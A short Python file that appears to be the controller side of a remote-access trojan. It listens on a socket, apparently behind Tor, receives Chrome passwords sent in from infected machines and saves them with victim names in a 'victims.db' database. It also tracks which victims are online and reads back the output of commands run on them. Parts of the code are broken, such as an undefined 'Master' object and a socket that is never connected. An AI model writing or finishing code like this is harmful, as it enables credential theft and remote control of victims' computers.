import socket, sqlite3,time, gui

dbConnection = sqlite3.connect("victims.db")
dbCursor = dbConnection.cursor()

# Define the listening port for the peer
listen_port = 8080

# Create a socket to listen for incoming connections
listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listen_sock.bind(('127.0.0.1', listen_port))
listen_sock.listen(1)

# Connect to the other peer through the SOCKS proxy
dest_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dest_sock.settimeout(10)

print("Tor connection is ready")

def hearingLoop():
    # Start the chat loop
    while True:
        # Wait for incoming messages
        try:
            client_sock, client_addr = listen_sock.accept()
            message = client_sock.recv(1024).decode('ascii')
            print(message)

            #send all chrome passwords if didnt already
            if(message.startswith("Chrome Passwords: ")):
                passwords = message[len("Chrome Passwords: "):message.find("Name:")]
                name = message[(len("Chrome Passwords: ")+len(passwords)+len("Name: ")):]
                #add the passwords to the DB
                dbCursor.execute(f"INSERT INTO victims VALUES ('{name}','{time.time()}','{passwords}')")

            if(message.startswith("Online: ")):
                Master.frame. append((message[len("Online: "):], client_sock))
                #also check if he is on the db and if not add him

            if(message.startswith("Output: ")):
                output = message[len("Output"):]
                print(output)
        except socket.timeout:
            pass

def sendMessage(message):
    dest_sock.send(message.encode('ascii'))
